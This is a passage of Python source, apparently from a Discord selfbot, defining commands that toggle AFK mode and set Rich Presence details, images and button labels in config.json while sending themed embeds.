            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Junk Nickname', description="Your nickname is now junk letters.",timestamp=embed_timestamp())
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)
        except Exception:
            return
        
    afk_messaged_people = []

    @React.command(usage="afk", description="Toggles AFK Mode")
    async def afk(ctx):
        global afk_stat
        afk_messaged_people = []    
        if afk_stat == 0:
            afk_stat += 1
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'AFK Mode', description='Sending automatic responses `enabled`',timestamp=embed_timestamp())
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)
                
        elif afk_stat == 1:
            afk_stat -= 1
            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'AFK Mode', description='Sending automatic responses `disabled`',timestamp=embed_timestamp())
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)


    @React.command(usage="rpc", description="Toggles Rich Presence")
    async def rpc(ctx):
        try:
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Rich Presence', description='Toggled Rich Presence.',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = 'Toggled Rich Presence.'
                await ctx.send(msg)
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['rich_presence']['enabled'] = not json.load(open("""config.json""", encoding="""utf-8"""))["""rich_presence"""]["""enabled"""]
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
                
        except Exception:
            pass

    @React.command(usage="rpccustommode", description="Toggles custom mode")
    async def rpccustommode(ctx):
        try:


            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Rich Presence', description='Toggled Custom Rich Presence.',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = 'Toggled Custom Rich Presence.'
                await ctx.send(msg)
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['rich_presence']['custom_mode'] = not json.load(open("""config.json""", encoding="""utf-8"""))["""rich_presence"""]["""custom_mode"""]
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
                
            await RPC.update(state=json.load(open('config.json', encoding='utf-8'))['rich_presence']['state'], details=json.load(open('config.json', encoding='utf-8'))['rich_presence']['details'], large_image=json.load(open('config.json', encoding='utf-8'))['rich_presence']['large_image'], large_text=json.load(open('config.json', encoding='utf-8'))['rich_presence']['large_image_text'], small_image=json.load(open('config.json', encoding='utf-8'))['rich_presence']['small_image'], small_text=json.load(open('config.json', encoding='utf-8'))['rich_presence']['small_image_text'], start=time.time(), buttons=[{"label": json.load(open('config.json', encoding='utf-8'))['rich_presence']['buttons']["button_one_label"], "url": json.load(open('config.json', encoding='utf-8'))['rich_presence']['buttons']["button_one_url"]}, {"label": json.load(open('config.json', encoding='utf-8'))['rich_presence']['buttons']["button_two_label"], "url": json.load(open('config.json', encoding='utf-8'))['rich_presence']['buttons']["button_two_url"]}])
        except Exception:
            pass

    @React.command(usage="rpctime", description="Toggle RPC Time")
    async def rpctime(ctx):
        try:

            embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Rich Presence', description='Toggled RPC time.',timestamp=embed_timestamp())
            embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
            embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
            embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
            await embed_or_codeblock(ctx, embed)

            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['rich_presence']['time'] = not json.load(open("""config.json""", encoding="""utf-8"""))["""rich_presence"""]["""time"""]
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
                
            await RPC.update(state=json.load(open('config.json', encoding='utf-8'))['rich_presence']['state'], details=json.load(open('config.json', encoding='utf-8'))['rich_presence']['details'], large_image=json.load(open('config.json', encoding='utf-8'))['rich_presence']['large_image'], large_text=json.load(open('config.json', encoding='utf-8'))['rich_presence']['large_image_text'], small_image=json.load(open('config.json', encoding='utf-8'))['rich_presence']['small_image'], small_text=json.load(open('config.json', encoding='utf-8'))['rich_presence']['small_image_text'], start=time.time(), buttons=[{"label": json.load(open('config.json', encoding='utf-8'))['rich_presence']['buttons']["button_one_label"], "url": json.load(open('config.json', encoding='utf-8'))['rich_presence']['buttons']["button_one_url"]}, {"label": json.load(open('config.json', encoding='utf-8'))['rich_presence']['buttons']["button_two_label"], "url": json.load(open('config.json', encoding='utf-8'))['rich_presence']['buttons']["button_two_url"]}])
        except Exception:
            pass

    @React.command(usage="rpcappid <Application ID>", description="Sets the RPC Application ID")
    async def rpcappid(ctx, application_id: int):
        try:
                
            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Rich Presence', description=f'Application ID set to **{application_id}**, restart to take effect.',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = f'Application ID set to {application_id}.'
                await ctx.send(msg)
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['rich_presence']['application_id'] = application_id
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
        except Exception:
            pass

    @React.command(usage="rpcdetails <Details>", description="Sets the RPC details")
    async def rpcdetails(ctx, *, details: str):
        try:

            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Rich Presence', description=f'Rich Presence details set to **{details}**',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = f'RPC details set to {details}.'
                await ctx.send(msg)
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['rich_presence']['details'] = details
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
                
            await RPC.update(state=json.load(open('config.json', encoding='utf-8'))['rich_presence']['state'], details=json.load(open('config.json', encoding='utf-8'))['rich_presence']['details'], large_image=json.load(open('config.json', encoding='utf-8'))['rich_presence']['large_image'], large_text=json.load(open('config.json', encoding='utf-8'))['rich_presence']['large_image_text'], small_image=json.load(open('config.json', encoding='utf-8'))['rich_presence']['small_image'], small_text=json.load(open('config.json', encoding='utf-8'))['rich_presence']['small_image_text'], start=time.time(), buttons=[{"label": json.load(open('config.json', encoding='utf-8'))['rich_presence']['buttons']["button_one_label"], "url": json.load(open('config.json', encoding='utf-8'))['rich_presence']['buttons']["button_one_url"]}, {"label": json.load(open('config.json', encoding='utf-8'))['rich_presence']['buttons']["button_two_label"], "url": json.load(open('config.json', encoding='utf-8'))['rich_presence']['buttons']["button_two_url"]}])

        except RuntimeWarning:
            pass

    @React.command(usage="rpcstate <State>", description="Sets the RPC state")
    async def rpcstate(ctx, *, state: str):
        try:


            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Rich Presence', description=f'Rich Presence state set to **{state}**',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = f'RPC state set to {state}.'
                await ctx.send(msg)
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['rich_presence']['state'] = state
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
                
            await RPC.update(state=json.load(open('config.json', encoding='utf-8'))['rich_presence']['state'], details=json.load(open('config.json', encoding='utf-8'))['rich_presence']['details'], large_image=json.load(open('config.json', encoding='utf-8'))['rich_presence']['large_image'], large_text=json.load(open('config.json', encoding='utf-8'))['rich_presence']['large_image_text'], small_image=json.load(open('config.json', encoding='utf-8'))['rich_presence']['small_image'], small_text=json.load(open('config.json', encoding='utf-8'))['rich_presence']['small_image_text'], start=time.time(), buttons=[{"label": json.load(open('config.json', encoding='utf-8'))['rich_presence']['buttons']["button_one_label"], "url": json.load(open('config.json', encoding='utf-8'))['rich_presence']['buttons']["button_one_url"]}, {"label": json.load(open('config.json', encoding='utf-8'))['rich_presence']['buttons']["button_two_label"], "url": json.load(open('config.json', encoding='utf-8'))['rich_presence']['buttons']["button_two_url"]}])
        except Exception:
            pass

    @React.command(usage="rpclargeimage <Image Name>", description="Sets the RPC large image")
    async def rpclargeimage(ctx, *, image_name: str):
        try:


            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Rich Presence', description=f'Rich Presence large image set to **{image_name}**',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = f'RPC large image set to {image_name}.'
                await ctx.send(msg)
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['rich_presence']['large_image'] = image_name
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
                
            await RPC.update(state=json.load(open('config.json', encoding='utf-8'))['rich_presence']['state'], details=json.load(open('config.json', encoding='utf-8'))['rich_presence']['details'], large_image=json.load(open('config.json', encoding='utf-8'))['rich_presence']['large_image'], large_text=json.load(open('config.json', encoding='utf-8'))['rich_presence']['large_image_text'], small_image=json.load(open('config.json', encoding='utf-8'))['rich_presence']['small_image'], small_text=json.load(open('config.json', encoding='utf-8'))['rich_presence']['small_image_text'], start=time.time(), buttons=[{"label": json.load(open('config.json', encoding='utf-8'))['rich_presence']['buttons']["button_one_label"], "url": json.load(open('config.json', encoding='utf-8'))['rich_presence']['buttons']["button_one_url"]}, {"label": json.load(open('config.json', encoding='utf-8'))['rich_presence']['buttons']["button_two_label"], "url": json.load(open('config.json', encoding='utf-8'))['rich_presence']['buttons']["button_two_url"]}])
        except Exception:
            pass


    @React.command(usage="rpclargeimagetext <Text>", description="Sets the RPC large image text")
    async def rpclargeimagetext(ctx, *, text: str):
        try:


            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Rich Presence', description=f'Rich Presence large image text set to **{text}**',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = f'RPC large image text set to {text}.'
                await ctx.send(msg)
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['rich_presence']['large_image_text'] = text
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
                
            await RPC.update(state=json.load(open('config.json', encoding='utf-8'))['rich_presence']['state'], details=json.load(open('config.json', encoding='utf-8'))['rich_presence']['details'], large_image=json.load(open('config.json', encoding='utf-8'))['rich_presence']['large_image'], large_text=json.load(open('config.json', encoding='utf-8'))['rich_presence']['large_image_text'], small_image=json.load(open('config.json', encoding='utf-8'))['rich_presence']['small_image'], small_text=json.load(open('config.json', encoding='utf-8'))['rich_presence']['small_image_text'], start=time.time(), buttons=[{"label": json.load(open('config.json', encoding='utf-8'))['rich_presence']['buttons']["button_one_label"], "url": json.load(open('config.json', encoding='utf-8'))['rich_presence']['buttons']["button_one_url"]}, {"label": json.load(open('config.json', encoding='utf-8'))['rich_presence']['buttons']["button_two_label"], "url": json.load(open('config.json', encoding='utf-8'))['rich_presence']['buttons']["button_two_url"]}])
        except Exception:
            pass
            
    @React.command(usage="rpcsmallimage <Image Name>", description="Sets the RPC small image")
    async def rpcsmallimage(ctx, *,  image_name: str):
        try:


            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Rich Presence', description=f'Rich Presence small image set to **{image_name}**',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = f'RPC small image set to {image_name}.'
                await ctx.send(msg)
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['rich_presence']['small_image'] = image_name
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
                
            await RPC.update(state=json.load(open('config.json', encoding='utf-8'))['rich_presence']['state'], details=json.load(open('config.json', encoding='utf-8'))['rich_presence']['details'], large_image=json.load(open('config.json', encoding='utf-8'))['rich_presence']['large_image'], large_text=json.load(open('config.json', encoding='utf-8'))['rich_presence']['large_image_text'], small_image=json.load(open('config.json', encoding='utf-8'))['rich_presence']['small_image'], small_text=json.load(open('config.json', encoding='utf-8'))['rich_presence']['small_image_text'], start=time.time(), buttons=[{"label": json.load(open('config.json', encoding='utf-8'))['rich_presence']['buttons']["button_one_label"], "url": json.load(open('config.json', encoding='utf-8'))['rich_presence']['buttons']["button_one_url"]}, {"label": json.load(open('config.json', encoding='utf-8'))['rich_presence']['buttons']["button_two_label"], "url": json.load(open('config.json', encoding='utf-8'))['rich_presence']['buttons']["button_two_url"]}])
        except Exception:
            pass

    @React.command(usage="rpcsmallimagetext <Text>", description="Sets the RPC small image text")
    async def rpcsmallimagetext(ctx, *,  text: str):
        try:


            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Rich Presence', description=f'Rich Presence small image text set to **{text}**',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = f'RPC small image text set to {text}.'
                await ctx.send(msg)
            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['rich_presence']['small_image_text'] = text
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
                
            await RPC.update(state=json.load(open('config.json', encoding='utf-8'))['rich_presence']['state'], details=json.load(open('config.json', encoding='utf-8'))['rich_presence']['details'], large_image=json.load(open('config.json', encoding='utf-8'))['rich_presence']['large_image'], large_text=json.load(open('config.json', encoding='utf-8'))['rich_presence']['large_image_text'], small_image=json.load(open('config.json', encoding='utf-8'))['rich_presence']['small_image'], small_text=json.load(open('config.json', encoding='utf-8'))['rich_presence']['small_image_text'], start=time.time(), buttons=[{"label": json.load(open('config.json', encoding='utf-8'))['rich_presence']['buttons']["button_one_label"], "url": json.load(open('config.json', encoding='utf-8'))['rich_presence']['buttons']["button_one_url"]}, {"label": json.load(open('config.json', encoding='utf-8'))['rich_presence']['buttons']["button_two_label"], "url": json.load(open('config.json', encoding='utf-8'))['rich_presence']['buttons']["button_two_url"]}])
        except Exception:
            pass

    @React.command(usage="rpcbtnonelabel <Label>", description="Sets the button one label")
    async def rpcbtnonelabel(ctx, *,  label: str):
        try:


            if True:
                embed = discord.Embed(color=int(json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_color'].replace('#', '0x'), 0), url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_title_url'], title=f'Rich Presence', description=f'Rich Presence button one label set to **{label}**',timestamp=embed_timestamp())
                embed.set_thumbnail(url = json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_thumbnail_url'])
                embed.set_footer(text=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_footer_url'])
                embed.set_author(name=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_name'], icon_url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_icon_url'], url=json.load(open(f'./Themes/{json.load(open("""config.json""", encoding="""utf-8"""))["""theme"""]}.json'))['embed_author_url'])
                await embed_or_codeblock(ctx, embed)


            else:
                msg = f'RPC button one label set to {label}.'
                await ctx.send(msg)

            with open("config.json", "r", encoding="utf-8") as jsonFile:
                data = json.load(jsonFile)
                
            data['rich_presence']['buttons']['button_one_label'] = label
            
            with open("config.json", "w", encoding="utf-8") as jsonFile:
                json.dump(data, jsonFile, indent=4, sort_keys=False)
                
